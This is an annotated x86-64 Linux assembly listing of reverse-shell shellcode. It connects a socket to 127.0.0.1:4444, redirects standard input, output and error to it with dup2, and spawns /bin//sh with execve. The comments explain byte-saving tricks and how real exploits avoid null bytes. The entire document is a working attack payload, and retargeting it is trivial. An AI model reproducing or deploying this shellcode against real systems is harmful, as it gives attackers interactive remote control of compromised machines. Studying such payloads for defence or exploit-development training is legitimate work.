global _start

section .text

_start:
    ; -------------------------------------------------------------------------
    ; 1. socket(AF_INET, SOCK_STREAM, 0)
    ; -------------------------------------------------------------------------
    ; syscall number 41 (sys_socket)
    ; Arguments: rdi=AF_INET(2), rsi=SOCK_STREAM(1), rdx=IPPROTO_IP(0)
    
    push 41
    pop rax         ; rax = 41
    push 2
    pop rdi         ; rdi = 2
    push 1
    pop rsi         ; rsi = 1
    cdq             ; MAGIC: usage of CDQ to zero out RDX. 
                    ; It extends the sign bit of EAX (0) into EDX.
                    ; Much shorter than 'mov rdx, 0'.
    syscall

    ; Save the socket file descriptor (returned in RAX) to RDI.
    ; RDI will be the first argument (sockfd) for the next syscalls.
    xchg rdi, rax   ; Efficient swap. RDI now holds sockfd.

    ; -------------------------------------------------------------------------
    ; 2. connect(sockfd, sockaddr, addrlen)
    ; -------------------------------------------------------------------------
    ; syscall number 42 (sys_connect)
    ; Arguments: rdi=sockfd, rsi=struct sockaddr*, rdx=addrlen(16)

    ; Stack structure for sockaddr_in (16 bytes total):
    ; We push this value in reverse order (Little Endian).
    ; 0x0100007F (127.0.0.1) + 0x5C11 (4444) + 0x0002 (AF_INET)
    ; Result: 0x0100007f5c110002
    
    ; WARNING: This value contains NULL bytes (0x00). 
    ; In a real exploit, this often requires XOR encoding to avoid the 0x00.
    mov rcx, 0x0100007f5c110002 
    push rcx
    
    mov rsi, rsp    ; rsi points to the struct we just pushed to the stack
    push 16
    pop rdx         ; rdx = 16 (sizeof sockaddr)
    push 42
    pop rax         ; rax = 42
    syscall

    ; -------------------------------------------------------------------------
    ; 3. dup2(sockfd, newfd)
    ; -------------------------------------------------------------------------
    ; Redirects Stdin (0), Stdout (1), Stderr (2) to the socket.
    ; syscall number 33 (sys_dup2)
    
    push 3
    pop rsi         ; Counter for 2, 1, 0
loop_dup2:
    dec rsi
    push 33
    pop rax
    syscall
    jnz loop_dup2   ; Jump if RSI is not zero.
                    ; Note: logic typically loops while RSI >= 0.

    ; -------------------------------------------------------------------------
    ; 4. execve("/bin//sh", NULL, NULL)
    ; -------------------------------------------------------------------------
    ; Spawns the shell.
    ; syscall number 59 (sys_execve)
    
    xor rsi, rsi    ; rsi = NULL (argv needs to be null)
    cdq             ; rdx = 0 (envp needs to be null)

    ; Push string "/bin//sh" (8 bytes) to stack
    ; 0x68732f6e69622f = hs/nib/
    ; Added extra slash for alignment: /bin//sh
    mov rbx, 0x68732f2f6e69622f
    push rbx
    
    push rsp
    pop rdi         ; rdi points to the string "/bin//sh" location on stack
    
    push 59
    pop rax         ; rax = 59
    syscall
